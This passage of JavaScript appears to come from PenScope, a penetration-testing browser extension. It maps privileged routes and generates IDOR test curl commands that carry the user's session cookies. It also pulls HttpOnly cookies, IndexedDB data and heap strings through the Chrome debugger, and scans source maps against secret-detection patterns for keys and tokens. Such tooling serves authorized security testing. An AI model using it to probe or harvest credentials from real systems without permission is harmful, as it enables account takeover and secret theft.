    r.isNoise=LIBRARY_NOISE.some(re=>re.test(r.path));
    // Classify intent based on path naming
    const p=(r.path||"").toLowerCase();
    if(/delete|remove|destroy|purge|revoke|ban|deactivate/i.test(p))r.intent="destructive";
    else if(/add|create|new|insert|register|submit|post|invite|enroll|write|update|edit|modify|patch|set|put|rename/i.test(p))r.intent="write";
    else if(/get|list|fetch|read|view|show|find|search|browse|all|count|index/i.test(p))r.intent="read";
    else if(/admin|manage|backoffice|controlpanel|superuser|staff|moderator/i.test(p))r.intent="admin";
    else if(/auth|login|logout|signin|signup|oauth|sso|token|password|mfa|2fa|otp|verify|confirm|register/i.test(p))r.intent="auth";
    else if(/upload|download|file|attachment|media|export|import|backup/i.test(p))r.intent="file";
    else if(/config|settings|preferences|env|feature|flag|system|setup/i.test(p))r.intent="config";
    else if(/pay|payment|checkout|billing|invoice|subscription|order|cart/i.test(p))r.intent="payment";
    else r.intent="unknown";
  });
}

// Build permission matrix — what routes exist for roles you can't access
function buildPermissionMatrix(tabId){
  const tab=T(tabId);
  const matrix=[];
  const userRole=(tab.runtime?.stores||[]).find(s=>s.type==="privesc-fields");
  if(!userRole)return;

  let roleData={};
  try{roleData=JSON.parse(typeof userRole.data==="string"?userRole.data:JSON.stringify(userRole.data));}catch(e){console.warn('[PenScope] buildPermissionMatrix parse',e.message||e);return;}

  const currentRole=roleData.role||"unknown";
  const isAdmin=roleData.isSystemAdmin==="True"||roleData.isAdministrationCategory==="True";
  const isTeacher=roleData.isTeachingCategory==="True";

  // Find routes that look admin/teacher-only
  tab.discoveredRoutes.forEach(r=>{
    if(r.isNoise||r.observed)return;
    const p=(r.path||"").toLowerCase();
    let requiredRole=null;
    if(/admin|manage|system|superuser|staff|moderator|controlpanel/i.test(p))requiredRole="Admin";
    else if(/teacher|instructor|educator|grading|grade.*assessment|lesson.*plan/i.test(p))requiredRole="Teacher";
    else if(/parent|guardian/i.test(p))requiredRole="Parent";
    if(requiredRole&&requiredRole!==currentRole){
      matrix.push({path:r.path,requiredRole,currentRole,intent:r.intent||"unknown",source:r.source,risk:requiredRole==="Admin"?"high":"medium"});
    }
  });

  // Also flag dangerous operations regardless of role naming
  tab.discoveredRoutes.forEach(r=>{
    if(r.isNoise||r.observed)return;
    if(r.intent==="destructive"||r.intent==="config"){
      if(!matrix.find(m=>m.path===r.path)){
        matrix.push({path:r.path,requiredRole:"elevated",currentRole,intent:r.intent,source:r.source,risk:"high"});
      }
    }
  });

  tab.permissionMatrix=matrix.sort((a,b)=>(a.risk==="high"?0:1)-(b.risk==="high"?0:1));
}

// Generate IDOR test commands
function generateIDORTests(tabId){
  const tab=T(tabId);
  const tests=[];
  if(tab.url&&!tab.url.startsWith("http")){tab.idorTests=tests;return;}
  const baseUrl=tab.url?new URL(tab.url).origin:"";
  // Get auth cookie for curl commands (escape double quotes)
  const authCookie=(tab.cookies||[]).filter(c=>c.name.includes("Identity")||c.name.includes("idsrv")||c.name.includes("session")||c.name.includes("auth")||c.name.includes("token")||c.name.includes("Auth")||c.name.includes("Cookie")).map(c=>`${c.name}=${c.value.replace(/"/g,'\\"')}`).join("; ");

  // From path params (numeric IDs, UUIDs)
  (tab.pathParams||[]).forEach(p=>{
    tests.push({type:"path-param",method:"GET",url:`${baseUrl}${p.path}`,original:p.value,paramType:p.type,suggestion:p.type==="numeric-id"?`Try ${parseInt(p.value)+1}, ${parseInt(p.value)-1}, 1, 0`:"Try another user's UUID",curl:`curl -b "${authCookie}" "${baseUrl}${p.path.replace(p.value,p.type==="numeric-id"?String(parseInt(p.value)+1):"OTHER_USER_UUID")}"`});
  });

  // From discovered API routes that take IDs
  tab.discoveredRoutes.forEach(r=>{
    if(r.isNoise||!r.path.startsWith("/api/"))return;
    const p=r.path;
    // Routes that likely take an ID parameter
    if(/Get\w+ById|Get\w+Details|GetUser|Delete\w+|Update\w+|Edit\w+/i.test(p)){
      tests.push({type:"discovered-route",method:r.intent==="destructive"?"DELETE":r.intent==="write"?"POST":"GET",url:`${baseUrl}${p}`,paramType:"needs-id",suggestion:"Append ?id=1 or /1 or /{userId}",curl:`curl -b "${authCookie}" "${baseUrl}${p}?id=1"`});
    }
  });

  // From response body internal IDs
  (tab.responseBodies||[]).forEach(rb=>{
    if(rb.pattern==="Internal ID"){
      tests.push({type:"leaked-id",method:"GET",value:rb.value,url:rb.url,suggestion:`ID ${rb.value} leaked at ${rb.url.substring(0,60)} — use in IDOR tests`,curl:`curl -b "${authCookie}" "${rb.url}"`});
    }
  });

  tab.idorTests=tests.slice(0,100);
}

// Helper: extract actual value from CDP Runtime.RemoteObject
function extractRemoteValue(ro){
  if(!ro)return "?";
  // Primitives — value is directly available
  if(ro.type==="string"||ro.type==="number"||ro.type==="boolean")return String(ro.value);
  // Undefined/null
  if(ro.type==="undefined")return "undefined";
  if(ro.subtype==="null")return "null";
  // Objects with preview — extract properties
  if(ro.preview&&ro.preview.properties){
    const obj={};
    ro.preview.properties.forEach(p=>{obj[p.name]=p.value||p.description||"?";});
    return JSON.stringify(obj);
  }
  // Objects with description
  if(ro.description)return ro.description.substring(0,2000);
  // Fallback to stringifying the whole thing
  try{return JSON.stringify(ro.value||ro).substring(0,2000);}catch(e){console.warn('[PenScope] extractRemoteValue',e.message||e);return String(ro.value||"?");}
}

// IndexedDB extraction via CDP
function extractIndexedDB(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  try{
    const origin=tab.url?new URL(tab.url).origin:"";
    if(!origin)return;
    chrome.debugger.sendCommand({tabId},"IndexedDB.requestDatabaseNames",{securityOrigin:origin},(result)=>{
      if(chrome.runtime.lastError||!result||!result.databaseNames)return;
      const dbNames=result.databaseNames;
      dbNames.forEach(dbName=>{
        chrome.debugger.sendCommand({tabId},"IndexedDB.requestDatabase",{securityOrigin:origin,databaseName:dbName},(dbResult)=>{
          if(chrome.runtime.lastError||!dbResult||!dbResult.databaseWithObjectStores)return;
          const db=dbResult.databaseWithObjectStores;
          const stores=db.objectStores||[];
          const dbEntry={name:dbName,version:db.version,stores:stores.map(s=>({name:s.name,keyPath:s.keyPath?s.keyPath.string||JSON.stringify(s.keyPath):"",autoIncrement:s.autoIncrement,indexes:(s.indexes||[]).map(i=>i.name)})),data:[]};
          // Read first 20 entries from each store
          let storesProcessed=0;
          if(!stores.length){tab.indexedDBData.push(dbEntry);return;}
          stores.forEach(store=>{
            chrome.debugger.sendCommand({tabId},"IndexedDB.requestData",{securityOrigin:origin,databaseName:dbName,objectStoreName:store.name,indexName:"",skipCount:0,pageSize:20},(dataResult)=>{
              storesProcessed++;
              if(!chrome.runtime.lastError&&dataResult&&dataResult.objectStoreDataEntries){
                dataResult.objectStoreDataEntries.forEach(entry=>{
                  const val=extractRemoteValue(entry.value);
                  const key=extractRemoteValue(entry.key||entry.primaryKey);
                  if(val.length>2)dbEntry.data.push({store:store.name,key:key.substring(0,200),value:val.substring(0,2000)});
                });
              }
              if(storesProcessed>=stores.length)tab.indexedDBData.push(dbEntry);
            });
          });
        });
      });
    });
  }catch(e){console.warn('[PenScope] extractIndexedDB',e.message||e);}
}

// CacheStorage extraction via CDP
function extractCacheStorage(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  try{
    const origin=tab.url?new URL(tab.url).origin:"";
    if(!origin)return;
    chrome.debugger.sendCommand({tabId},"CacheStorage.requestCacheNames",{securityOrigin:origin},(result)=>{
      if(chrome.runtime.lastError||!result||!result.caches)return;
      result.caches.forEach(cache=>{
        chrome.debugger.sendCommand({tabId},"CacheStorage.requestEntries",{cacheId:cache.cacheId,skipCount:0,pageSize:50},(entryResult)=>{
          if(chrome.runtime.lastError||!entryResult)return;
          const entries=(entryResult.cacheDataEntries||[]).map(e=>({url:e.requestURL,method:e.requestMethod||"GET",status:e.responseStatus||0,statusText:e.responseStatusText||"",type:e.responseType||"",contentLength:e.responseHeaders?e.responseHeaders.find(h=>h.name.toLowerCase()==="content-length")?.value:"?"}));
          tab.cacheStorageData.push({name:cache.cacheName||cache.cacheId,securityOrigin:cache.securityOrigin,entryCount:entryResult.returnCount||entries.length,entries:entries.slice(0,100)});
        });
      });
    });
  }catch(e){console.warn('[PenScope] extractCacheStorage',e.message||e);}
}

// Service Worker route detection via CDP
function extractServiceWorkerRoutes(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab._swRoutesExtracted)return;
  tab._swRoutesExtracted=true;
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var routes=[];
      try{
        if(navigator.serviceWorker&&navigator.serviceWorker.controller){
          routes.push({type:"active",scriptURL:navigator.serviceWorker.controller.scriptURL||"",state:navigator.serviceWorker.controller.state||""});
        }
      }catch(e){}
      try{
        var regs=[];
        if(navigator.serviceWorker){
          // Can't await in this context, return what we have synchronously
          routes.push({type:"api-available",scope:navigator.serviceWorker.ready?"pending":"none"});
        }
      }catch(e){}
      // Check for Workbox patterns in inline scripts
      try{
        var scripts=document.querySelectorAll("script:not([src])");
        for(var i=0;i<scripts.length;i++){
          var t=scripts[i].textContent||"";
          if(t.indexOf("workbox")>-1||t.indexOf("registerRoute")>-1||t.indexOf("serviceWorker.register")>-1){
            // Extract SW registration URL
            var regMatch=t.match(/serviceWorker\\.register\\(['"]([^'"]+)['"]/);
            if(regMatch)routes.push({type:"registration",scriptURL:regMatch[1],source:"inline-script"});
            // Extract Workbox route patterns
            var routeMatches=t.match(/registerRoute\\(([^)]+)/g)||[];
            routeMatches.forEach(function(m){
              routes.push({type:"workbox-route",pattern:m.substring(0,200),source:"inline-script"});
            });
          }
        }
      }catch(e){}
      return JSON.stringify(routes);
    })()`,
    returnByValue:true
  },(result)=>{
    if(chrome.runtime.lastError||!result?.result?.value)return;
    try{
      const routes=JSON.parse(result.result.value);
      if(routes.length)tab.serviceWorkers=[...tab.serviceWorkers,...routes];
    }catch(e){console.warn('[PenScope] extractSWRoutes',e.message||e);}
  });
}

// -------------------------------------------------------
// -------------------------------------------------------
// v5.3.2: SOURCE MAP INTELLIGENCE — parse, analyze, extract everything
// -------------------------------------------------------
function parseAndStoreSourceMap(tabId,rawBody,mapUrl,source){
  const tab=T(tabId);
  if(tab.parsedSourceMaps.length>=20)return; // cap
  try{
    const sm=JSON.parse(rawBody);
    if(!sm.sources)return;
    const sources=(sm.sources||[]).slice(0,1000);
    // v5.6: capture pre-minification identifiers from the `names` array. These are the real
    // function/variable names before minification — grep them for admin/auth/etc to surface
    // hidden functionality that you'd otherwise only see by downloading and reading source.
    const rawNames=Array.isArray(sm.names)?sm.names.filter(n=>typeof n==="string"&&n.length>1&&n.length<200):[];
    const result={url:mapUrl,source,timestamp:Date.now(),version:sm.version||3,sourceRoot:sm.sourceRoot||"",fileCount:sources.length,files:sources,
      names:rawNames.slice(0,5000),namesCount:rawNames.length,
      secrets:[],endpoints:[],routes:[],envVars:[],dependencies:[],todos:[],fileTree:{},
      sensitiveFiles:[],sourceContents:{}};

    // 1. Build file tree + detect sensitive paths
    const sensitivePatterns=["admin","auth","config","env","secret","key","password","token","credential","private","internal","debug","test","migration","seed","deploy"];
    sources.forEach(src=>{
      const clean=(src||"").replace(/^webpack:\/\/\/?/,"").replace(/^\.\//,"");
      const parts=clean.split("/");
      let node=result.fileTree;
      parts.forEach((p,i)=>{
        if(i===parts.length-1){if(!node._files)node._files=[];node._files.push(p);}
        else{if(!node[p])node[p]={};node=node[p];}
      });
      // Flag sensitive files
      const lower=clean.toLowerCase();
      if(sensitivePatterns.some(sp=>lower.includes(sp))||lower.endsWith(".env")||lower.includes("config.")||lower.includes(".secret")){
        result.sensitiveFiles.push(clean);
      }
    });

    // 2. Extract dependencies from node_modules paths
    const depsSeen=new Set();
    sources.forEach(src=>{
      const s=src||"";
      const nmIdx=s.indexOf("node_modules/");
      if(nmIdx===-1)return;
      const after=s.substring(nmIdx+13);
      let pkg;
      if(after.startsWith("@")){const parts=after.split("/");pkg=parts[0]+"/"+parts[1];}
      else{pkg=after.split("/")[0];}
      if(pkg&&!depsSeen.has(pkg)){depsSeen.add(pkg);result.dependencies.push(pkg);}
    });

    // 3. Scan sourcesContent for secrets, routes, env vars, endpoints, TODOs
    if(sm.sourcesContent){
      sm.sourcesContent.forEach((content,idx)=>{
        if(!content||content.length<30)return;
        const fileName=sources[idx]||"?";
        const chunk=content.substring(0,300000);
        // Store source content for viewer (first 50KB per file, max 10 files)
        if(Object.keys(result.sourceContents).length<10&&content.length>100){
          result.sourceContents[fileName]=content.substring(0,50000);
        }

        // === SECRETS (prefix-based, safe for any context) ===
        const secretPrefixes=[
          {n:"AWS Key",p:"AKIA",min:20},{n:"Stripe",p:"sk_live_",min:30},{n:"Stripe",p:"sk_test_",min:30},{n:"Stripe",p:"pk_live_",min:30},
          {n:"GitHub",p:"ghp_",min:40},{n:"GitHub",p:"ghs_",min:40},{n:"GitLab",p:"glpat-",min:25},{n:"Slack",p:"xoxb-",min:20},{n:"Slack",p:"xoxp-",min:20},
          {n:"SendGrid",p:"SG.",min:60},{n:"OpenAI",p:"sk-",min:40},{n:"Anthropic",p:"sk-ant-",min:40},{n:"HuggingFace",p:"hf_",min:30},
          {n:"MongoDB",p:"mongodb://",min:20},{n:"MongoDB",p:"mongodb+srv://",min:20},{n:"Postgres",p:"postgres://",min:20},{n:"MySQL",p:"mysql://",min:20},
          {n:"Redis",p:"redis://",min:15},{n:"Private Key",p:"-----BEGIN",min:30},{n:"Bearer",p:"Bearer ",min:25},{n:"JWT",p:"eyJhbG",min:30},
          {n:"Sentry DSN",p:"https://",min:40},{n:"npm Token",p:"npm_",min:35},{n:"Vault",p:"hvs.",min:25}
        ];
        secretPrefixes.forEach(sp=>{
          let pos=0,cnt=0;
          while(pos<chunk.length&&cnt<3){
            const i=chunk.indexOf(sp.p,pos);
            if(i===-1)break;
            let end=i+sp.p.length;
            while(end<chunk.length&&end-i<200&&chunk[end]!==" "&&chunk[end]!=='"'&&chunk[end]!=="'"&&chunk[end]!=="<"&&chunk[end]!==">"&&chunk[end]!=="\n"&&chunk[end]!=="\r"&&chunk[end]!==",")end++;
            const token=chunk.substring(i,end);
            if(token.length>=sp.min){cnt++;result.secrets.push({type:sp.n,value:token.substring(0,150),file:fileName,context:chunk.substring(Math.max(0,i-20),Math.min(chunk.length,end+20)).substring(0,150)});}
            pos=end+1;
          }
        });

        // === KEY=VALUE secrets (password, api_key, etc.) ===
        const kvPatterns=["password","passwd","api_key","apiKey","API_KEY","api_secret","secret_key","client_secret","private_key","access_token","auth_token","SECRET","DB_PASSWORD","DATABASE_URL","ENCRYPTION_KEY"];
        kvPatterns.forEach(kw=>{
          let pos=0,cnt=0;
          while(pos<chunk.length&&cnt<2){
            const i=chunk.indexOf(kw,pos);
            if(i===-1)break;
            const after=chunk.substring(i+kw.length,i+kw.length+5);
            if(after.indexOf("=")>-1||after.indexOf(":")>-1||after.indexOf('"')>-1){
              let qStart=-1;
              for(let qi=i+kw.length;qi<i+kw.length+10&&qi<chunk.length;qi++){if(chunk[qi]==='"'||chunk[qi]==="'"){qStart=qi;break;}}
              if(qStart>-1){
                const qChar=chunk[qStart];
                const qEnd=chunk.indexOf(qChar,qStart+1);
                if(qEnd>-1&&qEnd-qStart>3&&qEnd-qStart<200){
                  const val=chunk.substring(qStart+1,qEnd);
                  if(val.length>3&&val!=="true"&&val!=="false"&&val!=="null"&&val!=="undefined"&&val!=="string"&&val!=="object"){
                    cnt++;result.secrets.push({type:"Hardcoded "+kw,value:val.substring(0,150),file:fileName,context:chunk.substring(Math.max(0,i-10),Math.min(chunk.length,qEnd+10)).substring(0,150)});
                  }
                }
              }
            }
            pos=i+kw.length;
          }
        });

        // === ENV VARIABLES (process.env.*) ===
        let envPos=0;
        while(envPos<chunk.length){
          const ei=chunk.indexOf("process.env.",envPos);
          if(ei===-1)break;
          let ee=ei+12;
          while(ee<chunk.length&&((chunk.charCodeAt(ee)>=65&&chunk.charCodeAt(ee)<=90)||(chunk.charCodeAt(ee)>=97&&chunk.charCodeAt(ee)<=122)||(chunk.charCodeAt(ee)>=48&&chunk.charCodeAt(ee)<=57)||chunk[ee]==="_"))ee++;
          const envName=chunk.substring(ei+12,ee);
          if(envName.length>1&&!seen(tabId,"smenv",envName)){result.envVars.push({name:envName,file:fileName,context:chunk.substring(Math.max(0,ei-20),Math.min(chunk.length,ee+30)).substring(0,100)});}
          envPos=ee;
        }

        // === ROUTES (React Router, Vue Router, Angular, Next.js) ===
        const routePatterns=["path:","path :",'"path":',"path=","to:","to =","to=","redirect:","component:"];
        routePatterns.forEach(rp=>{
          let rpos=0,rcnt=0;
          while(rpos<chunk.length&&rcnt<20){
            const ri=chunk.indexOf(rp,rpos);
            if(ri===-1)break;
            // Look for a path value after this
            let vs=ri+rp.length;
            while(vs<chunk.length&&(chunk[vs]===" "||chunk[vs]==='"'||chunk[vs]==="'"))vs++;
            if(chunk[vs]==="/"){
              let ve=vs;
              while(ve<chunk.length&&chunk[ve]!=='"'&&chunk[ve]!=="'"&&chunk[ve]!==","&&chunk[ve]!=="}"&&chunk[ve]!==" "&&chunk[ve]!=="\n")ve++;
              const route=chunk.substring(vs,ve);
              if(route.length>1&&route.length<150&&!seen(tabId,"smroute",route)){
                rcnt++;result.routes.push({path:route,file:fileName,type:"router-config"});
              }
            }
            rpos=ri+rp.length;
          }
        });
        // Also look for fetch/axios URL patterns
        const fetchPatterns=["fetch(","axios.get(","axios.post(","axios.put(","axios.delete(","axios.patch(","axios({",".get(","http.get(","http.post(","api.get(","api.post("];
        fetchPatterns.forEach(fp=>{
          let fpos=0,fcnt=0;
          while(fpos<chunk.length&&fcnt<10){
            const fi=chunk.indexOf(fp,fpos);
            if(fi===-1)break;
            let qs=fi+fp.length;
            while(qs<chunk.length&&(chunk[qs]===" "||chunk[qs]==="`"||chunk[qs]==='"'||chunk[qs]==="'"))qs++;
            if(chunk[qs]==="/"){
              let qe=qs;
              while(qe<chunk.length&&chunk[qe]!=='"'&&chunk[qe]!=="'"&&chunk[qe]!=="`"&&chunk[qe]!==")"&&chunk[qe]!==","&&chunk[qe]!=="\n"&&qe-qs<150)qe++;
              const ep=chunk.substring(qs,qe);
              if(ep.length>2&&!seen(tabId,"smep",ep)){fcnt++;result.endpoints.push({path:ep,file:fileName,type:"fetch-call"});}
            }
            fpos=fi+fp.length;
          }
        });

        // === API PATH STRINGS ===
        const apiPrefixes=["/api/","/v1/","/v2/","/v3/","/v4/","/graphql","/rest/","/internal/","/admin/","/auth/","/users/","/account/"];
        apiPrefixes.forEach(ap=>{
          let apos=0,acnt=0;
          while(apos<chunk.length&&acnt<15){
            const ai=chunk.indexOf(ap,apos);
            if(ai===-1)break;
            let ae=ai+ap.length;
            while(ae<chunk.length&&chunk[ae]!=='"'&&chunk[ae]!=="'"&&chunk[ae]!=="`"&&chunk[ae]!==" "&&chunk[ae]!=="\n"&&ae-ai<150)ae++;
            const path=chunk.substring(ai,ae);
            if(path.length>ap.length&&!seen(tabId,"smep",path)){acnt++;result.endpoints.push({path,file:fileName,type:"api-string"});}
            apos=ae;
          }
        });

        // === TODO/FIXME/HACK comments (often contain secrets or reveal unfinished security) ===
        const todoMarkers=["TODO","FIXME","HACK","XXX","BUG","SECURITY","VULNERABLE","DEPRECATED","TEMP","REMOVE"];
        todoMarkers.forEach(marker=>{
          let tpos=0,tcnt=0;
          while(tpos<chunk.length&&tcnt<3){
            const ti=chunk.indexOf(marker,tpos);
            if(ti===-1)break;
            // Grab the rest of the line
            let le=chunk.indexOf("\n",ti);
            if(le===-1)le=Math.min(chunk.length,ti+200);
            const line=chunk.substring(ti,le).substring(0,200);
            if(line.length>marker.length+2){tcnt++;result.todos.push({marker,text:line,file:fileName});}
            tpos=le+1;
          }
        });
      });
    }

    tab.parsedSourceMaps.push(result);
    // Merge secrets into main secrets tab
    result.secrets.forEach(s=>{
      if(!seen(tabId,"smsec2",s.type+":"+s.value.substring(0,30))){
        tab.secrets.push({type:s.type,value:s.value,severity:s.type.includes("Key")||s.type.includes("Token")||s.type.includes("Secret")||s.type.includes("Password")||s.type.includes("Private")?"critical":"high",source:"sourcemap:"+s.file,context:s.context||""});
      }
    });
    // Merge endpoints into discovered routes
    result.endpoints.forEach(ep=>{
      if(!seen(tabId,"dr","sm2:"+ep.path))tab.discoveredRoutes.push({path:ep.path,source:"sourcemap-"+ep.type,type:"endpoint",context:ep.file||""});
    });
    result.routes.forEach(r=>{
      if(!seen(tabId,"dr","smr:"+r.path))tab.discoveredRoutes.push({path:r.path,source:"sourcemap-route",type:r.type,context:r.file||""});
    });
    return result;
  }catch(e){console.warn('[PenScope] parseSourceMap',e.message||e);return null;}
}

// v5.3.2: DEEP UPGRADES — real event listeners, HttpOnly cookies, response schemas, heap secrets
// -------------------------------------------------------

// #4: Real event listeners via DOMDebugger.getEventListeners (finds addEventListener calls)
function extractRealEventListeners(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.realEventListeners.length>0)return;
  // Step 1: get interesting DOM nodes via Runtime.evaluate
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var targets=[];
      // document and window are the most important for postMessage/storage handlers
      targets.push({desc:"window",idx:-1});
      targets.push({desc:"document",idx:-2});
      // Find forms, inputs, buttons, links
      var selectors=["form","input","button","a[href]","[data-action]","[onclick]","iframe"];
      selectors.forEach(function(sel){
        try{document.querySelectorAll(sel).forEach(function(el,i){
          if(targets.length>=50)return;
          var tag=el.tagName.toLowerCase();
          var id=el.id?"#"+el.id:"";
          var cls=el.className&&typeof el.className==="string"?"."+el.className.split(" ")[0]:"";
          targets.push({desc:tag+id+cls,idx:targets.length});
        });}catch(e){}
      });
      return JSON.stringify(targets.length);
    })()`,
    returnByValue:true
  },()=>{
    if(chrome.runtime.lastError)return;
    // Step 2: Get listeners on window and document using DOMDebugger
    // First get the document node
    chrome.debugger.sendCommand({tabId},"DOM.getDocument",{depth:0},(doc)=>{
      if(chrome.runtime.lastError||!doc||!doc.root)return;
      // Resolve window object
      chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{expression:"window",objectGroup:"penscope-listeners"},(winResult)=>{
        if(chrome.runtime.lastError||!winResult?.result?.objectId)return;
        // Get listeners on window (catches message, storage, hashchange, popstate)
        chrome.debugger.sendCommand({tabId},"DOMDebugger.getEventListeners",{objectId:winResult.result.objectId,depth:-1},(listeners)=>{
          if(chrome.runtime.lastError||!listeners)return;
          (listeners.listeners||[]).forEach(l=>{
            if(tab.realEventListeners.length>=200)return;
            const isInteresting=["message","storage","hashchange","popstate","submit","click","load","error","unhandledrejection"].indexOf(l.type)>-1;
            tab.realEventListeners.push({
              target:"window",
              event:l.type,
              handler:(l.handler?.description||"").substring(0,500),
              scriptId:l.scriptId||"",
              lineNumber:l.lineNumber||0,
              columnNumber:l.columnNumber||0,
              once:l.once||false,
              passive:l.passive||false,
              isInteresting
            });
          });
        });
        // Get listeners on document
        chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{expression:"document",objectGroup:"penscope-listeners"},(docResult)=>{
          if(chrome.runtime.lastError||!docResult?.result?.objectId)return;
          chrome.debugger.sendCommand({tabId},"DOMDebugger.getEventListeners",{objectId:docResult.result.objectId,depth:-1},(listeners)=>{
            if(chrome.runtime.lastError||!listeners)return;
            (listeners.listeners||[]).forEach(l=>{
              if(tab.realEventListeners.length>=200)return;
              const isInteresting=["message","submit","click","DOMContentLoaded","readystatechange","visibilitychange"].indexOf(l.type)>-1;
              tab.realEventListeners.push({
                target:"document",
                event:l.type,
                handler:(l.handler?.description||"").substring(0,500),
                scriptId:l.scriptId||"",
                lineNumber:l.lineNumber||0,
                columnNumber:l.columnNumber||0,
                once:l.once||false,
                passive:l.passive||false,
                isInteresting
              });
            });
            // Release object group
            chrome.debugger.sendCommand({tabId},"Runtime.releaseObjectGroup",{objectGroup:"penscope-listeners"});
          });
        });
      });
    });
  });
}

// #5: HttpOnly cookies via Network.getCookies (invisible to document.cookie)
function extractHttpOnlyCookies(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.httpOnlyCookies.length>0)return;
  const url=tab.url;
  if(!url||!url.startsWith("http"))return;
  chrome.debugger.sendCommand({tabId},"Network.getCookies",{urls:[url]},(result)=>{
    if(chrome.runtime.lastError||!result||!result.cookies)return;
    result.cookies.forEach(c=>{
      tab.httpOnlyCookies.push({
        name:c.name,
        value:c.value.substring(0,200),
        domain:c.domain,
        path:c.path,
        httpOnly:c.httpOnly,
        secure:c.secure,
        sameSite:c.sameSite||"None",
        expires:c.expires>0?new Date(c.expires*1000).toISOString():"session",
        size:c.size||0,
        priority:c.priority||"Medium",
        // Flag security issues
        issues:[]
      });
      const ck=tab.httpOnlyCookies[tab.httpOnlyCookies.length-1];
      if(!c.httpOnly)ck.issues.push("No HttpOnly");
      if(!c.secure)ck.issues.push("No Secure");
      if(!c.sameSite||c.sameSite==="None")ck.issues.push("SameSite=None");
      if(c.value.length>100)ck.issues.push("Large value ("+c.value.length+" chars)");
      // Detect auth cookies by name
      const ln=c.name.toLowerCase();
      if(ln.indexOf("session")>-1||ln.indexOf("auth")>-1||ln.indexOf("token")>-1||ln.indexOf("jwt")>-1||ln.indexOf("identity")>-1||ln.indexOf("connect.sid")>-1||ln.indexOf("csrf")>-1)ck.isAuthCookie=true;
    });
  });
}

// #9: Auto-extract API response schemas from captured JSON responses
function extractResponseSchemas(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.responseSchemas.length>0)return;
  (tab.apiResponseBodies||[]).forEach(resp=>{
    if(!resp.bodyPreview||resp.bodyPreview.length<10)return;
    try{
      const body=JSON.parse(resp.bodyPreview.length>500?resp.bodyPreview:resp.bodyPreview);
      const schema={url:resp.url,path:resp.path,status:resp.status,fields:[]};
      function extractFields(obj,prefix,depth){
        if(!obj||typeof obj!=="object"||depth>4)return;
        const isArr=Array.isArray(obj);
        if(isArr&&obj.length>0){
          extractFields(obj[0],prefix+"[].",depth+1);
          return;
        }
        for(const[k,v] of Object.entries(obj)){
          const fullKey=prefix+k;
          const type=v===null?"null":Array.isArray(v)?"array":typeof v;
          const isSensitive=["password","secret","token","key","auth","ssn","credit","card","cvv","pin"].some(s=>k.toLowerCase().includes(s));
          const isId=["id","_id","uuid","pk","userId","accountId","memberId"].some(s=>k.toLowerCase()===s.toLowerCase()||k.toLowerCase().endsWith("id")||k.toLowerCase().endsWith("_id"));
          schema.fields.push({key:fullKey,type,isSensitive,isId,sample:type==="string"?String(v).substring(0,50):type==="number"?v:null});
          if(type==="object")extractFields(v,fullKey+".",depth+1);
          else if(type==="array"&&v.length>0)extractFields(v[0],fullKey+"[].",depth+1);
        }
      }
      extractFields(body,"",0);
      if(schema.fields.length>0)tab.responseSchemas.push(schema);
    }catch(e){}
  });
}

// #10: Heap snapshot secrets — search V8 heap for leaked secrets in closures
function extractHeapSecrets(tabId){
  if(!_debugTabs.has(tabId))return;
  const tab=T(tabId);
  if(tab.heapSecrets.length>0)return;
  // Use Runtime.queryObjects to find all string objects matching patterns
  // This is lighter than a full heap snapshot
  chrome.debugger.sendCommand({tabId},"Runtime.evaluate",{
    expression:`(function(){
      var found=[];
      var seen={};
      function check(val,source){
        if(!val||typeof val!=="string"||val.length<10||val.length>2000)return;
        if(seen[val])return;seen[val]=1;
        // Secret patterns via indexOf (no regex in template literal)
        var patterns=[
          {n:"AWS Key",p:"AKIA",minLen:20},
          {n:"Bearer",p:"Bearer ",minLen:30},
          {n:"JWT",p:"eyJhbG",minLen:30},
          {n:"GitHub",p:"ghp_",minLen:40},
          {n:"GitHub",p:"ghs_",minLen:40},
          {n:"Stripe",p:"sk_live_",minLen:30},
          {n:"Stripe",p:"sk_test_",minLen:30},
          {n:"Slack",p:"xoxb-",minLen:20},
          {n:"Slack",p:"xoxp-",minLen:20},
          {n:"OpenAI",p:"sk-",minLen:40},
          {n:"Private Key",p:"-----BEGIN",minLen:30},
          {n:"MongoDB",p:"mongodb://",minLen:20},
          {n:"MongoDB",p:"mongodb+srv://",minLen:20},
          {n:"Postgres",p:"postgres://",minLen:20},
          {n:"Redis",p:"redis://",minLen:15},
          {n:"Internal URL",p:"http://10.",minLen:15},
          {n:"Internal URL",p:"http://192.168.",minLen:15},
          {n:"Internal URL",p:"http://172.",minLen:15},
          {n:"Internal URL",p:"http://localhost",minLen:15}
        ];
        for(var i=0;i<patterns.length;i++){
          if(val.indexOf(patterns[i].p)===0&&val.length>=patterns[i].minLen){
            found.push({type:patterns[i].n,value:val.substring(0,100),source:source,length:val.length});
            return;
          }
        }
        // High-entropy string detection (potential API keys in closures)
        if(val.length>=32&&val.length<=128){
          var validChars=0;
          for(var j=0;j<val.length;j++){
            var c=val.charCodeAt(j);
            if((c>=48&&c<=57)||(c>=65&&c<=90)||(c>=97&&c<=122)||c===45||c===95)validChars++;
          }
          if(validChars===val.length){
            var chars={};for(var k=0;k<val.length;k++)chars[val[k]]=(chars[val[k]]||0)+1;
            var entropy=0;for(var ch in chars){var p=chars[ch]/val.length;entropy-=p*Math.log2(p);}
            if(entropy>4.0){found.push({type:"High-Entropy",value:val.substring(0,60)+"...",source:source,length:val.length,entropy:Math.round(entropy*10)/10});}
          }
        }
      }
      // Walk deeper: check prototype chains, closures via toString
      try{
        // Check all frames
        var frames=[window];
        try{for(var fi=0;fi<window.frames.length&&fi<5;fi++){try{frames.push(window.frames[fi]);}catch(e){}}}catch(e){}
        frames.forEach(function(frame){
          try{
            // Walk 3 levels deep on all window properties
            var keys=Object.getOwnPropertyNames(frame).slice(0,500);
            keys.forEach(function(k){
              try{
                var v=frame[k];
                if(typeof v==="string"){check(v,"window."+k);return;}
